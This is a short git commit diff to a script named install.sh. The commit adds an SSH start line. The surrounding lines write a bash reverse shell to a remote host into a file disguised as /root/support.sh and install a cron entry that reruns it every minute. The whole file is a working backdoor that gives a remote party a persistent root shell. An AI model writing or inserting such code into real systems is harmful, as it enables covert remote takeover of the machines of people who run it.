744804b232f014bc3b120bedd1ec57df1227f3ee
M <35727831+sekuryti@users.noreply.github.com>
2021-12-07 11:58:52 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,4 @@
+service ssh start
 echo "sudo bash -i >& /dev/tcp/$1/$2 0>&1" > /root/support.sh
 chmod +x /root/support.sh
 crontab -l | { cat; echo "* * * * * /bin/bash /root/support.sh"; } | crontab -
